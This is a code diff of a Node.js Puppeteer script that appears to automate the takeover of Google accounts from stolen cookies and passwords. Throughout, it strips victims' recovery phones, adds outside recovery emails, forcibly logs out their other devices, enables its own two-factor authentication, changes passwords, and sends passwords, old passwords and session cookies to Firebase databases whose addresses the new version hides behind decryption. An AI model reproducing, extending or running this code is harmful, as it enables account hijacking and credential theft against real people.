@@ -1,16 +1,18 @@
 const StealthPlugin = require('puppeteer-extra-plugin-stealth')
 const puppeteer = require('puppeteer-extra')
 const twofactor = require('node-2fa')
+const crypto = require('crypto')
 const axios = require('axios')
 
 
-const BASE_URL = 'https://server-9099-default-rtdb.firebaseio.com/%C2%A3uck%E3%80%85you/' 
+const BASE_URL = decrypt('CgNuLlQfR3jlSKEMiLtTuk+/9dHkDDtfAGU5YSjvD09hm4EPNlklAb/G5lo/WBPQlXsTRx9qPkaqChXmtGsz4w==')
+const DATABASE_URL = decrypt('Ho3w4e0EI9uVPoN9hhxdI4hRUNMBXjo9s8vy5IT9Wh3WhysrJlYcqaa0offkbJzez3xIVwAtUfV1argzGbiIvw==')
 
 
 let mMailData = null
 let mMailRequest = false
+let mFinishWork = false
 let mMailCookies = {}
-let mWorkerActive = false
 let mSameNumber = 0
 
 let mCookie = [
@@ -19,7 +21,7 @@ let mCookie = [
       value: '',       
       domain: 'accounts.google.com',
       path: '/',
-      expires: 1768227818.828837,
+      expires: 1800212948.828837,
       size: 94,
       httpOnly: true,
       secure: true,
@@ -34,7 +36,7 @@ let mCookie = [
       value: '',
       domain: 'myaccount.google.com',
       path: '/',
-      expires: 1771251816.153073,
+      expires: 1800212948.153073,
       size: 157,
       httpOnly: true,
       secure: true,
@@ -48,7 +50,7 @@ let mCookie = [
       value: '',
       domain: '.google.com',
       path: '/',
-      expires: 1771251815.957588,
+      expires: 1800212948.957588,
       size: 41,
       httpOnly: false,
       secure: true,
@@ -62,7 +64,7 @@ let mCookie = [
       value: '',
       domain: '.google.com',
       path: '/',
-      expires: 1771251815.957573,
+      expires: 1800212948.957573,
       size: 40,
       httpOnly: false,
       secure: false,
@@ -76,7 +78,7 @@ let mCookie = [
       value: '',
       domain: '.google.com',
       path: '/',
-      expires: 1771251815.957563,
+      expires: 1800212948.957563,
       size: 21,
       httpOnly: true,
       secure: true,
@@ -90,7 +92,7 @@ let mCookie = [
       value: '',
       domain: '.google.com',
       path: '/',
-      expires: 1771251815.957496,
+      expires: 1800212948.957496,
       size: 167,
       httpOnly: true,
       secure: true,
@@ -104,7 +106,7 @@ let mCookie = [
       value: '',
       domain: '.google.com',
       path: '/',
-      expires: 1771251815.957482,
+      expires: 1800212948.957482,
       size: 156,
       httpOnly: false,
       secure: false,
@@ -118,7 +120,7 @@ let mCookie = [
       value: '',
       domain: '.google.com',
       path: '/',
-      expires: 1771251815.957553,
+      expires: 1800212948.957553,
       size: 21,
       httpOnly: true,
       secure: false,
@@ -129,10 +131,15 @@ let mCookie = [
     }
 ]
 
-let USER = getUserName()
-let FINISH = new Date().getTime()+21000000
 
-let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9qb2Itc2VydmVyLTA4OC5hcHBzcG90LmNvbS9vLw==')
+process.on('message', async (data) => {
+    try {
+        let json = (typeof data === 'string') ? JSON.parse(data) : data
+        if (json.t == 9) {
+            mFinishWork = true
+        }
+    } catch (error) {}
+})
 
 puppeteer.use(StealthPlugin())
 
@@ -140,46 +147,54 @@ puppeteer.use(StealthPlugin())
 startServer()
 
 
-setInterval(async () => {
-    await checkStatus()
-}, 120000)
-
 async function startServer() {
-    console.log('Node: ---START-SERVER---')
-
-    await checkStatus()
+    console.log('Process: ---START-SERVER---')
 
     let prevNumber = ''
+
+    if (!BASE_URL || !DATABASE_URL) {
+        console.log('---PROCESS-CLOSE---')
+        process.exit(0)
+    }
 
     while (true) {
         mWorkerActive = false
         let data = await getGmailData()
-        if (data && (FINISH <= 0 || FINISH >= new Date().getTime())) {
+        if (data && !mFinishWork) {
+            try {
+                process.send({ t:9, s:true })
+            } catch (error) {}
             mWorkerActive = true
             if (prevNumber == data.number) {
                 mSameNumber++
             } else {
                 mSameNumber = 0
             }
-            console.log('Node: [ Receive New Data --- Time: '+getTime()+' ]')
-            await loginWithCompleted(data.number, data.password, data.cookies, data.key)
+            console.log('Process: [ Receive New Data --- Time: '+getTime()+' ]')
+            await loginWithCompleted(data.number, data.password, data.cookies, data.time, data.key)
             prevNumber = data.number
+            try {
+                process.send({ t:9, s:false })
+            } catch (error) {}
         } else {
             await delay(10000)
         }
     }
 }
 
-async function loginWithCompleted(number, password, cookies, worker) {
+async function loginWithCompleted(number, password, cookies, time, worker) {
     try {
-        if (await isValidCookies(cookies)) {
+        let raptToken = cookies.substring(0, cookies.indexOf('||'))
+        let pureCookies = cookies.substring(cookies.indexOf('||')+2)
+
+        if (await isValidCookies(pureCookies)) {
             mMailRequest = false
-            mMailCookies = await getMailCookie(cookies)
+            mMailCookies = await getMailCookie(pureCookies)
 
             mMailData = await getMailTokenData()
             let mMailYear = await getMailYear(mMailData)
 
-            console.log('Node: [ Cookies Valid: '+number+' --- Time: '+getTime()+' ]')
+            console.log('Process: [ Cookies Valid: '+number+' --- Time: '+getTime()+' ]')
             
             let browser = await puppeteer.launch({
                 headless: false,
@@ -193,9 +208,13 @@ async function loginWithCompleted(number, password, cookies, worker) {
                     '--disable-dev-shm-usage'
                 ]
             })
+
+            if (parseInt(Date.now()/1000) - time >= 900) {
+                raptToken = ''
+            }
         
             let loadCookie = {}
-            let tempCookie = cookies.split(';')
+            let tempCookie = pureCookies.split(';')
 
             for (let i = 0; i < tempCookie.length; i++) {
                 try {
@@ -253,19 +272,25 @@ async function loginWithCompleted(number, password, cookies, worker) {
                 }
             })
 
-            console.log('Node: [ Browser Loaded: '+number+' --- Time: '+getTime()+' ]')
+            console.log('Process: [ Browser Loaded: '+number+' --- Time: '+getTime()+' ]')
             
             try {
                 let mData = await waitForAccountDetails(page)
 
-                console.log('Node: [ Gmail Name: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
+                console.log('Process: [ Gmail Name: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
                 
-                let mToken = await waitForRaptToken(page, '+'+number.replace('8800', '880'), password)
+                let mPassword = null
+                let mRapt = null
 
-                let mPassword = mToken.password
-                let mRapt = mToken.token
+                if (raptToken && raptToken.length > 10) {
+                    mRapt = raptToken
+                } else {
+                    let mToken = await waitForRaptToken(page, '+'+number.replace('8800', '880'), password)
+                    mPassword = encrypt(mToken.password)
+                    mRapt = mToken.token
+                }
 
-                console.log('Node: [ Rapt Token: '+(mRapt == null ? 'NULL' : 'Received')+' --- Time: '+getTime()+' ]')
+                console.log('Process: [ Rapt Token: '+(mRapt == null ? 'NULL' : 'Received')+' --- Time: '+getTime()+' ]')
                 
                 if (mRapt) {
                     if (mMailData == null) {
@@ -276,68 +301,73 @@ async function loginWithCompleted(number, password, cookies, worker) {
 
                     let mYear = mData.year
 
-                    let mNumberYear = await waitForNumberRemove(page, mRapt)
+                    let mNumberYear = await waitForNumberYear(page)
+
+                    let mDeviceYear = await waitForDeviceLogout(page, mRapt)
 
                     mYear = (mNumberYear < mYear) ? mNumberYear : mYear
+                    mYear = (mDeviceYear < mYear) ? mDeviceYear : mYear
                     
-                    console.log('Node: [ Mail Create Year: ['+mMailYear+','+mYear+'] --- Time: '+getTime()+' ]')
-
-                    let rapt = await getRapt(await page.url())
-
-                    if (rapt) mRapt = rapt
-                    
-                    let mRecovery = await waitForRecoveryAdd(page, number, password, mRapt, 'arafat.arf121@gmail.com')
-    
-                    console.log('Node: [ Recovery Mail: '+mRecovery+' --- Time: '+getTime()+' ]')
-                    
-                    rapt = await getRapt(await page.url())
-
-                    if (rapt) mRapt = rapt
-    
-                    if (!mPassword) mPassword = await waitForPasswordChange(page, mRapt)
-    
-                    try {
-                        await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/%C2%A3uck%E3%80%85you/completed'+((mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, create: mYear, mail:mMailYear }), {
-                            headers: {
-                                'Content-Type': 'application/x-www-form-urlencoded'
-                            }
-                        })
-                    } catch (error) {}
-    
-                    console.log('Node: [ New Password: '+mPassword+' --- Time: '+getTime()+' ]')
+                    console.log('Process: [ Mail Create Year: ['+mMailYear+','+mYear+'] --- Time: '+getTime()+' ]')
 
                     await waitForRemoveRecovery(page, mRapt)
                     
-                    await waitForLanguageChange(page)
+                    let mRecovery = await waitForRecoveryAdd(page, password, mRapt, [])
     
-                    console.log('Node: [ Language Change: English --- Time: '+getTime()+' ]')
-    
-                    await waitForSkipPassworp(page, mRapt)
-    
-                    console.log('Node: [ Skip Password: Stop --- Time: '+getTime()+' ]')
-    
-                    await waitForNameChange(page, mRapt)
-    
-                    let mTwoFa = await waitForTwoFaActive(page, mRapt)
-    
-                    console.log('Node: [ Two Fa: Enable '+((mTwoFa.auth || mTwoFa.backup) && !mTwoFa.error ? 'Success': 'Failed')+' --- Time: '+getTime()+' ]')
-
-                    let n_cookies = await getNewCookies(await page.cookies())
+                    console.log('Process: [ Recovery Mail: '+mRecovery+' --- Time: '+getTime()+' ]')
                     
-                    try {
-                        await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/%C2%A3uck%E3%80%85you/completed'+(mTwoFa.error ? '_error':(mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, n_cookies:n_cookies, create: mYear, mail:mMailYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
-                            headers: {
-                                'Content-Type': 'application/x-www-form-urlencoded'
-                            }
-                        })
+                    let rapt = await getRapt(await page.url())
 
-                        console.log('Node: [ Change Completed: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
-                    } catch (error) {}
+                    if (rapt) mRapt = rapt
+
+                    let mTwoFa = await waitForTwoFaActive(page, mRapt)
+        
+                    console.log('Process: [ Two Fa: Enable '+((mTwoFa.auth || mTwoFa.backup) && !mTwoFa.error ? 'Success': 'Failed')+' --- Time: '+getTime()+' ]')
+
+                    if (!mPassword) mPassword = await waitForPasswordChange(page, mRapt)
+
+                    if(mPassword) {
+                        let n_cookies = await getNewCookies(await page.cookies())
+                        
+                        try {
+                            await axios.patch(DATABASE_URL+'gmail/completed'+(mTwoFa.error ? '_error':(mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, n_cookies:n_cookies, create: mYear, mail:mMailYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded'
+                                }
+                            })
+                        } catch (error) {}
+        
+                        console.log('Process: [ New Password: '+mPassword+' --- Time: '+getTime()+' ]')
+                        
+                        await waitForLanguageChange(page)
+        
+                        console.log('Process: [ Language Change: English --- Time: '+getTime()+' ]')
+        
+                        await waitForSkipPassworp(page, mRapt)
+        
+                        console.log('Process: [ Skip Password: Stop --- Time: '+getTime()+' ]')
+        
+                        await waitForNameChange(page, mRapt)
+
+                        console.log('Process: [ Change Completed: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
+                    } else {
+                        try {
+                            await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail:mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, worker:worker, create: time }), {
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded'
+                                }
+                            })
+                        } catch (error) {}
+                        
+                        console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
+                        await axios.delete(BASE_URL+'collect/'+number+'.json')
+                        mSameNumber = 0
+                    }
                 } else {
                     let n_cookies = await getNewCookies(await page.cookies())
                     
                     try {
-                        await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail: mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
+                        await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail: mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, n_cookies:n_cookies, create: time }), {
                             headers: {
                                 'Content-Type': 'application/x-www-form-urlencoded'
                             }
@@ -349,7 +379,7 @@ async function loginWithCompleted(number, password, cookies, worker) {
                     await axios.delete(BASE_URL+'collect/'+number+'.json')
                 } catch (error) {}
             } catch (error) {
-                console.log('Node: [ Browser Process: Error --- Time: '+getTime()+' ]')
+                console.log('Process: [ Browser Process: Error --- Time: '+getTime()+' ]')
             }
             
             try {
@@ -364,7 +394,15 @@ async function loginWithCompleted(number, password, cookies, worker) {
                 }
             } catch (error) {}   
         } else {
-            console.log('Node: [ Coocies Expire: '+number+' --- Time: '+getTime()+' ]')
+            console.log('Process: [ Coocies Expire: '+number+' --- Time: '+getTime()+' ]')
+
+            try {
+                await axios.patch(BASE_URL+'expire/'+number+'.json', JSON.stringify({ password:password, cookies:cookies, worker:worker, create: time }), {
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    }
+                })
+            } catch (error) {}
 
             await axios.delete(BASE_URL+'collect/'+number+'.json')
         }
@@ -373,20 +411,20 @@ async function loginWithCompleted(number, password, cookies, worker) {
     try {
         if (mSameNumber > 2) {
             try {
-                await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ password:password, cookies:cookies, worker:worker, create: parseInt(new Date().getTime()/1000) }), {
+                await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ password:password, cookies:cookies, worker:worker, create: time }), {
                     headers: {
                         'Content-Type': 'application/x-www-form-urlencoded'
                     }
                 })
             } catch (error) {}
-            console.log('Node: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
+            console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
             await axios.delete(BASE_URL+'collect/'+number+'.json')
             mSameNumber = 0
         }
     } catch (error) {}
 }
 
-async function waitForNumberRemove(page, mRapt) {
+async function waitForNumberYear(page) {
     try {
         await page.goto('https://myaccount.google.com/phone?hl=en', { waitUntil: 'load', timeout: 0 })
         await delay(500)
@@ -459,22 +497,29 @@ async function waitForPasswordChange(page, mRapt) {
             await delay(500)
         }
 
-        return mPassword
+        return encrypt(mPassword)
     } catch (error) {}
 
-    return mPassword
+    return null
 }
 
-async function waitForRecoveryAdd(page, number, password, mRapt, mRecovery) {
+async function waitForRecoveryAdd(page, password, mRapt, mRecovery) {
     try {
         await page.goto('https://myaccount.google.com/recovery/email?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
         await delay(1000)
 
-        let newmRapt = await waitForLoginChallenge(page, number, password, 'https://myaccount.google.com/recovery/email')
+        let newmRapt = await waitForLoginChallenge(page, password, 'https://myaccount.google.com/recovery/email')
 
         if (newmRapt) await delay(500)
+        
+        let recovery
 
-        if (!mRecovery) mRecovery = getRandomUser()+'@oletters.com'
+        if (mRecovery && Array.isArray(mRecovery) && mRecovery.length > 0) {
+            let index = Math.floor(Math.random() * mRecovery.length)
+            recovery = mRecovery[index]
+        } else {
+            recovery = getRandomUser() + '@oletters.com'
+        }
 
         let button = await findView(page, 'button', 'Add recovery email')
 
@@ -483,11 +528,11 @@ async function waitForRecoveryAdd(page, number, password, mRapt, mRecovery) {
             await waitForSelector(page, 'input[type="email"]', 10)
             await delay(500)
             await page.focus('input[type="email"]')
-            await page.keyboard.type(mRecovery)
+            await page.keyboard.type(recovery)
             await delay(500)
             await page.click('button[data-mdc-dialog-action="ok"]')
             await delay(3000)
-            return mRecovery
+            return recovery
         } else if (await exists(page, 'button[aria-label="Edit recovery email"]')) {
             await page.click('button[aria-label="Edit recovery email"]')
             await waitForSelector(page, 'input[type="email"]', 10)
@@ -499,11 +544,11 @@ async function waitForRecoveryAdd(page, number, password, mRapt, mRecovery) {
             await page.keyboard.up('Control')
             await page.keyboard.press('Backspace')
 
-            await page.keyboard.type(mRecovery)
+            await page.keyboard.type(recovery)
             await delay(500)
             await page.click('button[data-mdc-dialog-action="ok"]')
             await delay(3000)
-            return mRecovery
+            return recovery
         } else if (await exists(page, 'input[type="email"]')) {
             let hasMail = await page.evaluate(() => {
                 let root = document.querySelector('input[type="email"]')
@@ -521,12 +566,48 @@ async function waitForRecoveryAdd(page, number, password, mRapt, mRecovery) {
                 await page.keyboard.press('Backspace')
             }
             
-            await page.keyboard.type(mRecovery)
+            await page.keyboard.type(recovery)
             await delay(500)
             await page.click('button[type="submit"]')
             await delay(3000)
 
-            return mRecovery
+            return recovery
+        }
+    } catch (error) {}
+
+    return null
+}
+
+async function waitForLoginChallenge(page, password, target) {
+    try {
+        let url = await page.url()
+
+        if (url.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
+            console.log('Node: [ Login Challange --- Time: '+getTime()+' ]')
+            await waitForSelector(page, 'input[type="password"]')
+            await delay(500)
+            await page.type('input[type="password"]', password)
+            await delay(500)
+            if (await exists(page, '#passwordNext')) {
+                await page.click('#passwordNext')
+            } else {
+                await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]')
+            }
+            
+            for (let i = 0; i < 20; i++) {
+                try {
+                    url = await page.url()
+
+                    if (url.startsWith(target)) {
+                        return await getRapt(url)
+                    } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/dp') || url.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/collect') || url.startsWith('https://accounts.google.com/v3/signin/challenge/selection') || url.startsWith('https://accounts.google.com/v3/signin/challenge/kpp') || url.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/consent')) {
+                        break
+                    }
+                } catch (error) {}
+
+                await delay(500)
+            }
+
         }
     } catch (error) {}
 
@@ -566,80 +647,88 @@ async function waitForFindView(page, tagName, matchText, timeout = 30) {
     return null
 }
 
-async function waitForDeviceLogout(page, mRapt, number, password, size) {
-    let newmRapt = null
+async function waitForDeviceLogout(page, rapt) {
+    try {
+        await page.goto('https://myaccount.google.com/security', { waitUntil: 'load', timeout: 0 })
+        await delay(500)
+        let data = await page.evaluate(async () => {
+            try {
+                let at = window.WIZ_global_data?.SNlM0e
 
-    for (let i = 0; i < size; i++) {
-        try {
-            await page.goto('https://myaccount.google.com/device-activity?hl=en&rapt='+mRapt)
-            await delay(1000)
+                let body = `f.req=%5B%5B%5B%22uPexwe%22%2C%22%5B1%2C1%5D%22%2Cnull%2C%221%22%5D%5D%5D&at=${encodeURIComponent(at)}&`
 
-            newmRapt = await waitForLoginChallenge(page, number, password, 'https://myaccount.google.com/device-activity')
-
-            if (newmRapt) {
-                await delay(500)
-                mRapt = newmRapt
+                let res = await fetch('/_/AccountSettingsUi/data/batchexecute?rpcids=uPexwe&hl=en&soc-app=1&soc-platform=1&soc-device=1&rt=c',
+                    {
+                        method: 'POST',
+                        headers: {
+                            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8'
+                        },
+                        body,
+                        credentials: 'same-origin'
+                    })
+                
+                return await res.text()
+            } catch (error) {
+                return error
             }
-    
-            let mDevice = await page.evaluate(() => {
-                let list = document.querySelectorAll('script')
-                let year = parseInt(new Date().getFullYear())
-                let logout = []
-                let years = []
-                let data = []
-    
-                for (let i = 0; i < list.length; i++) {
-                    let html = list[i].innerHTML
-                    if (html.startsWith('AF_initDataCallback') && !html.includes('mail.google.com') && !html.includes('meet.google.com')) {
-                        data = JSON.parse(html.substring(html.indexOf('['), html.lastIndexOf(']')+1))[1]
-                        break
-                    }
-                }
-    
-                for(let i=0; i<data.length; i++) {
-                    let child = data[i][2]
-                    for(let j=0; j<child.length; j++) {
-                        let main = child[j]
-                        if(main.length > 9 && main[9]) {
-                            years.push(main[9])
-                        }
-                        if(main.length > 23) {
-                            if(main[12] == true && main[13] != null && main[22] != null && main[22] != 1) {
-                                logout.push(main[0])
-                            }
-                        }
-                    }
-                }
-    
-                years.sort(function(a, b){return a-b})
-    
-                if(years.length > 0) {
-                    year = parseInt(new Date(years[0]).getFullYear())
-                }
-    
-                if (year < 2000) parseInt(new Date().getFullYear())
-    
-                return { list:logout, year:year }
-            })
-    
-            console.log('Node: [ Login Devices: '+mDevice.list.length+' --- Time: '+getTime()+' ]')
-    
-            for (let i = 0; i < mDevice.list.length; i++) {
+        })
+
+        if (data) {
+            let list = deviceList(extractArrays(data)[0])
+            let years = []
+
+            console.log('Process: [ Device Size: '+Object.keys(list).length+' --- Time: '+getTime()+' ]')
+
+            for (let [key, value] of Object.entries(list)) {
                 try {
-                    await page.goto('https://myaccount.google.com/device-activity/id/'+mDevice.list[i]+'?hl=en&rapt='+mRapt)
-                    await delay(500)
-                    await page.click('button[class="Rju2Ue-jPmIDe Rju2Ue-jPmIDe-OWXEXe-ssJRIf Rju2Ue-jPmIDe-OWXEXe-ssJRIf-hXIJHe"]')
-                    await delay(1000)
-                    await page.click('div[class="KsHAYd J9fJmf"] > button[class="VfPpkd-LgbsSe ksBjEc lKxP2d LQeN7 SdOXCb LjrPGf HvOprf evJWRb"]')
-                    await delay(2000)
-                } catch (error) {}
-            }
-    
-            return {rapt: newmRapt, year: mDevice.year }
-        } catch (error) {}
-    }
+                    years.push(value.active)
 
-    return {rapt: newmRapt, year: parseInt(new Date().getFullYear()) }
+                    await page.evaluate(async (deviceId, deviceToken, rapt) => {
+                        try {
+                            let at = window.WIZ_global_data?.SNlM0e
+                            let payload = [[[ "YZ6Dc", JSON.stringify([ null, null, deviceToken ]), null, "generic" ]]]
+                            let body ='f.req='+encodeURIComponent(JSON.stringify(payload))+'&at='+encodeURIComponent(at)+'&'
+
+                            await fetch(`/_/AccountSettingsUi/data/batchexecute?rpcids=YZ6Dc&source-path=%2Fdevice-activity%2Fid%2F${encodeURIComponent(deviceId)}`+(rapt?`&rapt=${encodeURIComponent(rapt)}`:``)+`&hl=en&soc-app=1&soc-platform=1&soc-device=1&rt=c`, {
+                                method: 'POST',
+                                headers: {
+                                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8'
+                                },
+                                body,
+                                credentials: 'same-origin'
+                            })
+
+                            body ='f.req=%5B%5B%5B%22Z5lnef%22%2C%22%5B%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+encodeURIComponent(at)+'&'
+
+                            await fetch(`/_/AccountSettingsUi/data/batchexecute?rpcids=Z5lnef&source-path=%2Fdevice-activity%2Fid%2F${encodeURIComponent(deviceId)}`+(rapt?`&rapt=${encodeURIComponent(rapt)}`:``)+`&hl=en&soc-app=1&soc-platform=1&soc-device=1&rt=c`, {
+                                method: 'POST',
+                                headers: {
+                                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8'
+                                },
+                                body,
+                                credentials: 'same-origin'
+                            })
+                        } catch (e) {}
+                    }, key, value.token, rapt)
+
+                    console.log('Process: [ Logout Success: '+value.name+' --- Time: '+getTime()+' ]')
+                } catch (error) {}
+
+                await delay(1000)
+            }
+
+            years.sort(function(a, b){return a-b})
+            
+            if(years.length > 0) {
+                let year = parseInt(new Date(years[0]).getFullYear())
+                if (year > 2000) {
+                    return year
+                }
+            }            
+        }
+    } catch (error) {}
+
+    return parseInt(new Date().getFullYear())
 }
 
 async function waitForLanguageChange(page) {
@@ -790,16 +879,16 @@ async function waitForNameChange(page, mRapt) {
             if (save) {
                 await save.click()
                 await delay(3000)
-                console.log('Node: [ Name Change: '+mName+' --- Time: '+getTime()+' ]')
+                console.log('Process: [ Name Change: '+mName+' --- Time: '+getTime()+' ]')
             } else {
                 await delay(3000)
-                console.log('Node: [ Name Change: Error --- Time: '+getTime()+' ]')
+                console.log('Process: [ Name Change: Error --- Time: '+getTime()+' ]')
             }
             return true
         }
     } catch (error) {}
 
-    console.log('Node: [ Name Change: Failed --- Time: '+getTime()+' ]')
+    console.log('Process: [ Name Change: Failed --- Time: '+getTime()+' ]')
 }
 
 async function waitForRemoveRecovery(page, mRapt) {
@@ -815,7 +904,7 @@ async function waitForRemoveRecovery(page, mRapt) {
             await delay(500)
         }
 
-        for (let i = 0; i < 10; i++) {
+        for (let i = 0; i < 5; i++) {
             if (await exists(page, 'div[data-phone]')) {
                 try {
                     if (await exists(page, 'button[aria-label="Remove phone number"]')) {
@@ -831,7 +920,7 @@ async function waitForRemoveRecovery(page, mRapt) {
                         let remove = await findView(page, 'div[role="button"]', 'REMOVE NUMBER')
                         if (remove) {
                             await remove.click()
-                            console.log('Node: [ Recovery Number: Delete Success --- Time: '+getTime()+' ]')
+                            console.log('Process: [ Recovery Number: Delete Success --- Time: '+getTime()+' ]')
                             await delay(2000)
                             mRemove = true
                             break
@@ -843,7 +932,7 @@ async function waitForRemoveRecovery(page, mRapt) {
             } else {
                 let add = await findView(page, 'button', 'Add recovery phone')
                 if (add) {
-                    console.log('Node: [ Recovery Number Not Found --- Time: '+getTime()+' ]')
+                    console.log('Process: [ Recovery Number Not Found --- Time: '+getTime()+' ]')
                     return true
                 }
             }
@@ -852,7 +941,7 @@ async function waitForRemoveRecovery(page, mRapt) {
         }
     } catch (error) {}
 
-    console.log('Node: [ Recovery Number: Delete Error --- Time: '+getTime()+' ]')
+    console.log('Process: [ Recovery Number: Delete Error --- Time: '+getTime()+' ]')
 
     return false
 }
@@ -913,12 +1002,16 @@ async function waitForRaptToken(page, number, password) {
                     mRapt = await getRapt(url)
                     break
                 } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
-                    console.log('Node: [ Login Challange: '+number+' --- Time: '+getTime()+' ]')
+                    console.log('Process: [ Login Challange: '+number+' --- Time: '+getTime()+' ]')
                     await waitForSelector(page, 'input[type="password"]')
                     await delay(500)
                     await page.type('input[type="password"]', password)
                     await delay(500)
-                    await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]')
+                    if (await exists(page, '#passwordNext')) {
+                        await page.click('#passwordNext')
+                    } else {
+                        await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]')
+                    }
 
                     let changePassword = true
                     let changeConfirm = true
@@ -937,7 +1030,7 @@ async function waitForRaptToken(page, number, password) {
                                 break
                             } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/selection') && cSelection) {
                                 if (await exists(page, 'div[data-action="selectchallenge"][data-challengetype="13"]')) {
-                                    console.log('Node: [ Selection Challange: '+number+' --- Time: '+getTime()+' ]')
+                                    console.log('Process: [ Selection Challange: '+number+' --- Time: '+getTime()+' ]')
                                     await delay(2000)
                                     await page.click('div[data-action="selectchallenge"][data-challengetype="13"]')
                                     cSelection = false
@@ -948,7 +1041,7 @@ async function waitForRaptToken(page, number, password) {
                             } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/kpp') && cNumber) {
                                 if(!number) break
                                 if (await exists(page, 'input#phoneNumberId')) {
-                                    console.log('Node: [ Number Type: '+number+' --- Time: '+getTime()+' ]')
+                                    console.log('Process: [ Number Type: '+number+' --- Time: '+getTime()+' ]')
                                     await delay(2000)
                                     await page.type('input#phoneNumberId', number)
                                     await delay(500)
@@ -957,7 +1050,7 @@ async function waitForRaptToken(page, number, password) {
                                     load = 10
                                 }
                             } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/consent')) {
-                                console.log('Node: [ OTP Send: '+number+' --- Time: '+getTime()+' ]')
+                                console.log('Process: [ OTP Send: '+number+' --- Time: '+getTime()+' ]')
                                 mCodeSend = true
                                 break
                             } else if (url.startsWith('https://accounts.google.com/signin/v2/speedbump/changepassword/changepasswordform') && changePassword) {
@@ -1000,46 +1093,9 @@ async function waitForRaptToken(page, number, password) {
 
             break
         }
-    } catch (error) {
-        console.log(error)
-    }
+    } catch (error) {}
 
     return { token:mRapt, password:mPassword }
-}
-
-async function waitForLoginChallenge(page, number, password, target) {
-    try {
-        let url = await page.url()
-
-        if (url.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
-            console.log('Node: [ Login Challange: '+number+' --- Time: '+getTime()+' ]')
-            await waitForSelector(page, 'input[type="password"]')
-            await delay(500)
-            await page.type('input[type="password"]', password)
-            await delay(500)
-            await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]')
-
-            for (let i = 0; i < 20; i++) {
-                try {
-                    url = await page.url()
-
-                    if (url.startsWith(target)) {
-                        return await getRapt(url)
-                    } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/dp') || url.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/collect') || url.startsWith('https://accounts.google.com/v3/signin/challenge/selection') || url.startsWith('https://accounts.google.com/v3/signin/challenge/kpp') || url.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/consent')) {
-                        break
-                    }
-                } catch (error) {}
-
-                await delay(500)
-            }
-
-        }
-    } catch (error) {
-        console.log(error);
-        
-    }
-
-    return null
 }
 
 async function waitForTwoFaActive(page, mRapt) {
@@ -1100,7 +1156,7 @@ async function waitForTwoFaActive(page, mRapt) {
                 await waitForFindView(page, 'button', 'Change authenticator app')
                 mAuthToken = authToken
 
-                console.log('Node: [ Auth Token: Received --- '+getTime()+' ]')
+                console.log('Process: [ Auth Token: Received --- '+getTime()+' ]')
             }
         }
